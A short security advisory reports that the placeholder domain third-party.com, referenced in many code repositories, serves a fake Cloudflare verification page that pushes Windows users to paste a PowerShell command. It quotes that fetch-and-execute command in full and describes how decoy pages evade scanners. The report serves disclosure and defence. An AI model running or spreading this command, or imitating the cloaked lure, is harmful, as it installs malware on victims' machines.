The documentation placeholder domain third-party.com is serving a ClickFix attack to Windows visitors. Unlike example.com, which IANA reserves for documentation, third-party.com is an ordinary registered domain that anyone can claim, and someone did. Manifold Security researchers including Ax Sharma and Swapnil Patil disclosed that the domain is hardcoded in over 1,500 files across 1,700+ repositories, among them Chromium, Sanity and Vercel, so documentation, tests and AI skills referencing it point readers at attacker infrastructure. BleepingComputer confirmed the fake Cloudflare "Performing security verification" page shown to Windows user agents.

The lure copies a PowerShell command to the clipboard, powershell "Write-Host(&{iex(irm('elxxvvx[.]xyz/f'))})2>$null", dressed up as a captcha token, then talks the victim into Win+R, Ctrl+V and Enter. macOS and Linux callers get a harmless "macOS is not supported" decoy, so scanners using non-Windows user agents see the benign page. That gating has prior telemetry: the IPFire blocklist listed the domain as malware on July 7, 2026 and removed it on July 17, consistent with checkers receiving the decoy. A VirusTotal scan dated May 2, 2026 shows the second-stage domain elxxvvx[.]xyz distributing a PowerShell script that pulls a 131MB update2.zip, so the infrastructure predates the September disclosure by months.

At disclosure time the payload host was not resolving. Watch whether third-party.com changes hands or gets sinkholed, for new second-stage infrastructure, and for copycats registering other unreserved placeholder domains used in docs and AI tooling.
